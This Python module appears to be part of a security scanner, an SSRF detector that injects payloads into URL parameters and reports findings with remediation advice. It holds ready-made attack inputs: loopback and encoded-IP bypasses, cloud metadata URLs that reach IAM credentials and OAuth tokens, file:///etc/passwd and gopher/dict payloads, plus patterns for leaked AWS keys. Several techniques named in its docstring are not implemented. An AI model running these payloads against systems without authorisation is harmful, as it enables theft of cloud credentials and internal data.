"""
AETHER SSRF Engine — Server-Side Request Forgery Detection.

Techniques:
1. Internal network probing (127.0.0.1, 169.254.169.254, [::1])
2. Protocol smuggling (file://, gopher://, dict://)
3. URL parser confusion (double encoding, IP format tricks)
4. Cloud metadata endpoint access (AWS/GCP/Azure IMDS)
5. DNS rebinding indicators
6. Redirect-chain SSRF
"""

from __future__ import annotations

import asyncio
import hashlib
import logging
import re
import time
from typing import Callable, Awaitable
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse, quote

import httpx

from core.http_client import ScannerAsyncClient
from core.surface_graph import ScanSurfaceGraph
from core.evidence_manager import save_evidence

logger = logging.getLogger(__name__)

# Parameters commonly vulnerable to SSRF
SSRF_PARAM_NAMES = {
    "url", "uri", "path", "src", "source", "dest", "destination",
    "redirect", "redirect_url", "redirect_uri", "return", "return_url",
    "next", "goto", "target", "link", "feed", "host", "site",
    "callback", "cb", "proxy", "proxy_url", "forward", "forward_to",
    "fetch", "load", "request", "ping", "webhook", "webhook_url",
    "notify_url", "image_url", "avatar_url", "icon_url", "logo_url",
    "file", "filename", "page", "ref", "referrer", "domain",
    "endpoint", "api_url", "service_url", "xml_url", "wsdl",
    "rss", "atom", "import_url", "export_url", "download",
}

# ── SSRF Payloads ──────────────────────────────────────────────

INTERNAL_TARGETS = [
    # Localhost variations
    ("http://127.0.0.1", "localhost-ip"),
    ("http://localhost", "localhost-name"),
    ("http://[::1]", "ipv6-loopback"),
    ("http://0.0.0.0", "zero-ip"),
    ("http://0", "zero-short"),
    ("http://127.1", "short-localhost"),
    ("http://127.0.0.1:80", "localhost-port80"),
    ("http://127.0.0.1:443", "localhost-port443"),
    ("http://127.0.0.1:8080", "localhost-port8080"),
    ("http://127.0.0.1:3000", "localhost-port3000"),
    # IP encoding tricks
    ("http://2130706433", "decimal-ip"),           # 127.0.0.1 in decimal
    ("http://0x7f000001", "hex-ip"),               # 127.0.0.1 in hex
    ("http://017700000001", "octal-ip"),            # 127.0.0.1 in octal
    ("http://127.0.0.1.nip.io", "nip-io-bypass"),
    # URL parser confusion
    ("http://evil.com@127.0.0.1", "at-sign-bypass"),
    ("http://127.0.0.1#@evil.com", "fragment-bypass"),
    ("http://127.0.0.1%23@evil.com", "encoded-fragment"),
    ("http://127.0.0.1:80%40evil.com", "encoded-at"),
]

CLOUD_METADATA_TARGETS = [
    # AWS IMDS v1
    ("http://169.254.169.254/latest/meta-data/", "aws-imds-v1", "AWS"),
    ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "aws-iam-creds", "AWS"),
    ("http://169.254.169.254/latest/user-data", "aws-user-data", "AWS"),
    ("http://169.254.169.254/latest/dynamic/instance-identity/document", "aws-instance-identity", "AWS"),
    # GCP
    ("http://metadata.google.internal/computeMetadata/v1/", "gcp-metadata", "GCP"),
    ("http://169.254.169.254/computeMetadata/v1/", "gcp-metadata-ip", "GCP"),
    # Azure
    ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "azure-imds", "Azure"),
    ("http://169.254.169.254/metadata/identity/oauth2/token", "azure-token", "Azure"),
    # DigitalOcean
    ("http://169.254.169.254/metadata/v1/", "digitalocean-metadata", "DigitalOcean"),
]

PROTOCOL_PAYLOADS = [
    ("file:///etc/passwd", "file-etc-passwd"),
    ("file:///etc/hosts", "file-etc-hosts"),
    ("file:///c:/windows/win.ini", "file-win-ini"),
    ("file:///proc/self/environ", "file-proc-environ"),
    ("gopher://127.0.0.1:25/", "gopher-smtp"),
    ("dict://127.0.0.1:6379/info", "dict-redis"),
]

# Patterns that indicate successful SSRF
SSRF_SUCCESS_INDICATORS = {
    "localhost-access": [
        re.compile(r"<title>.*(?:Apache|nginx|IIS|Welcome).*</title>", re.I),
        re.compile(r"It works!", re.I),
        re.compile(r"Welcome to nginx", re.I),
    ],
    "aws-metadata": [
        re.compile(r"ami-[a-f0-9]+"),
        re.compile(r"(?:us|eu|ap|sa|ca|me|af)-(?:east|west|north|south|central|northeast|southeast)-[0-9]"),
        re.compile(r"i-[a-f0-9]+"),
        re.compile(r"AccessKeyId"),
        re.compile(r"SecretAccessKey"),
    ],
    "gcp-metadata": [
        re.compile(r"project/project-id"),
        re.compile(r"instance/zone"),
    ],
    "file-read": [
        re.compile(r"root:.*:0:0:"),     # /etc/passwd
        re.compile(r"\[extensions\]"),     # win.ini
        re.compile(r"127\.0\.0\.1.*localhost"),  # /etc/hosts
    ],
}


def _check_ssrf_indicators(response_text: str, payload_type: str) -> list[str]:
    """Check if the response contains indicators of successful SSRF."""
    matched = []
    for category, patterns in SSRF_SUCCESS_INDICATORS.items():
        for pattern in patterns:
            if pattern.search(response_text):
                matched.append(f"{category}: {pattern.pattern[:50]}")
    return matched


async def run_ssrf_scan(
    url: str,
    intensity: str,
    broadcast_cb: Callable[[dict], Awaitable[None]],
    *,
    surface_graph: ScanSurfaceGraph | None = None,
    auth_profiles: dict | None = None,
    scan_config: dict | None = None,
) -> list[dict]:
    """Run comprehensive SSRF scanning."""
    findings = []
    start_time = time.monotonic()
    
    await broadcast_cb({"type": "log", "message": "SSRF Engine: Starting server-side request forgery detection..."})
    
    # Find parameters likely vulnerable to SSRF
    injection_targets = []
    if surface_graph:
        for node in surface_graph.targets():
            params = node.get("params", [])
            parsed = urlparse(node.get("url", ""))
            query_params = list(parse_qs(parsed.query).keys())
            all_params = list(set(params + query_params))
            
            # Only test params with SSRF-like names
            ssrf_params = [p for p in all_params if p.lower() in SSRF_PARAM_NAMES]
            # Also test all params if they're few enough
            if not ssrf_params and len(all_params) <= 3:
                ssrf_params = all_params
            
            if ssrf_params:
                injection_targets.append({
                    "url": node["url"],
                    "method": node.get("method", "GET"),
                    "params": ssrf_params,
                })
    
    if not injection_targets:
        parsed = urlparse(url)
        base_params = [p for p in parse_qs(parsed.query).keys() if p.lower() in SSRF_PARAM_NAMES]
        if base_params:
            injection_targets = [{"url": url, "method": "GET", "params": base_params}]
        else:
            # Test with common SSRF parameter names
            injection_targets = [{"url": url, "method": "GET", "params": ["url", "redirect", "next", "callback"]}]
    
    max_targets = {"stealth": 3, "normal": 10, "aggressive": 25, "extreme": 50}.get(intensity, 10)
    injection_targets = injection_targets[:max_targets]
    
    concurrency = {"stealth": 1, "normal": 3, "aggressive": 6, "extreme": 10}.get(intensity, 3)
    semaphore = asyncio.Semaphore(concurrency)
    tested = 0
    
    await broadcast_cb({
        "type": "log",
        "message": f"    Testing {sum(len(t['params']) for t in injection_targets)} SSRF-candidate parameters"
    })
    
    async with ScannerAsyncClient(
        timeout=httpx.Timeout(15.0),
        follow_redirects=False,  # Important: don't follow redirects for SSRF testing
        verify=False,
    ) as client:
        
        async def _inject(target_url: str, method: str, param: str, payload: str) -> httpx.Response | None:
            try:
                async with semaphore:
                    if method == "GET":
                        parsed = urlparse(target_url)
                        qp = parse_qs(parsed.query)
                        qp[param] = [payload]
                        test_url = urlunparse(parsed._replace(query=urlencode(qp, doseq=True)))
                        return await client.get(test_url)
                    else:
                        return await client.post(target_url, data={param: payload})
            except Exception:
                return None
        
        for target in injection_targets:
            target_url = target["url"]
            method = target["method"]
            
            for param in target["params"]:
                tested += 1
                
                # Get baseline with a normal external URL
                baseline = await _inject(target_url, method, param, "https://www.example.com")
                if not baseline:
                    continue
                
                baseline_hash = hashlib.sha256(baseline.text.encode()).hexdigest()[:16]
                baseline_len = len(baseline.text)
                
                # ── Test internal targets ──────────────────────────
                for payload, name in INTERNAL_TARGETS:
                    resp = await _inject(target_url, method, param, payload)
                    if not resp:
                        continue
                    
                    resp_hash = hashlib.sha256(resp.text.encode()).hexdigest()[:16]
                    indicators = _check_ssrf_indicators(resp.text, name)
                    
                    # Detect SSRF: response differs from baseline AND contains indicators
                    # OR response status changed significantly
                    is_different = resp_hash != baseline_hash and abs(len(resp.text) - baseline_len) > 100
                    
                    if indicators or (is_different and resp.status_code == 200):
                        severity = "Critical" if indicators else "High"
                        confidence = 0.92 if indicators else 0.7
                        
                        evidence = save_evidence(
                            "ssrf_engine", target_url, resp,
                            extra_info=f"Parameter: {param}\nPayload: {payload}\nName: {name}\nIndicators: {indicators}\nResponse size diff: {len(resp.text) - baseline_len}"
                        )
                        
                        findings.append({
                            "type": f"Server-Side Request Forgery ({name})",
                            "severity": severity,
                            "module": "ssrf_engine",
                            "vector": f"{method} {urlparse(target_url).path} → param: {param}",
                            "payload": payload,
                            "evidence": evidence,
                            "description": f"The parameter '{param}' is vulnerable to SSRF. "
                                         f"Injecting '{payload}' caused the server to make a request to an internal resource. "
                                         f"{'Indicators found: ' + ', '.join(indicators) if indicators else 'Response differed significantly from baseline.'}",
                            "confidence": "high" if indicators else "medium",
                            "confidence_score": confidence,
                            "verification_state": "verified" if indicators else "observed",
                            "remediation": "Implement allowlist-based URL validation. Block requests to internal/private IP ranges. "
                                         "Use a URL parser that handles all encoding schemes. Disable unnecessary protocols.",
                            "patch_provided": True,
                            "target_url": target_url,
                            "wstg": "WSTG-INPV-19",
                            "cwe": ["CWE-918"],
                            "owasp_category": "A10:2021 Server-Side Request Forgery",
                        })
                        
                        await broadcast_cb({
                            "type": "log",
                            "message": f"    🔴 {'CONFIRMED' if indicators else 'POTENTIAL'} SSRF: {param} @ {urlparse(target_url).path} [{name}]"
                        })
                        break  # Found SSRF for this param, move on
                
                # ── Test cloud metadata ────────────────────────────
                if intensity in ("aggressive", "extreme"):
                    for payload, name, cloud in CLOUD_METADATA_TARGETS:
                        resp = await _inject(target_url, method, param, payload)
                        if not resp:
                            continue
                        
                        indicators = _check_ssrf_indicators(resp.text, name)
                        if indicators or (resp.status_code == 200 and len(resp.text) > 50 and resp.text != baseline.text):
                            evidence = save_evidence(
                                "ssrf_engine", target_url, resp,
                                extra_info=f"Parameter: {param}\nPayload: {payload}\nCloud: {cloud}\nIndicators: {indicators}"
                            )
                            
                            findings.append({
                                "type": f"SSRF — Cloud Metadata Access ({cloud})",
                                "severity": "Critical",
                                "module": "ssrf_engine",
                                "vector": f"{method} {urlparse(target_url).path} → param: {param}",
                                "payload": payload,
                                "evidence": evidence,
                                "description": f"CRITICAL: The parameter '{param}' allows access to {cloud} cloud metadata endpoint. "
                                             f"Payload '{payload}' returned cloud infrastructure data. "
                                             "This can expose IAM credentials, instance identity, and configuration data.",
                                "confidence": "high",
                                "confidence_score": 0.95,
                                "verification_state": "verified",
                                "remediation": f"Block access to metadata endpoints (169.254.169.254). "
                                             f"Enable {cloud} IMDSv2 (token-based). Implement strict URL allowlisting.",
                                "patch_provided": True,
                                "target_url": target_url,
                                "wstg": "WSTG-INPV-19",
                                "cwe": ["CWE-918"],
                            })
                            
                            await broadcast_cb({
                                "type": "log",
                                "message": f"    🔴 CRITICAL SSRF: {param} → {cloud} metadata access!"
                            })
                            break
    
    elapsed = time.monotonic() - start_time
    confirmed = sum(1 for f in findings if f.get("verification_state") == "verified")
    
    await broadcast_cb({
        "type": "log",
        "message": f"    SSRF Engine Complete ({elapsed:.1f}s): {len(findings)} findings ({confirmed} confirmed) from {tested} parameters"
    })
    
    return findings
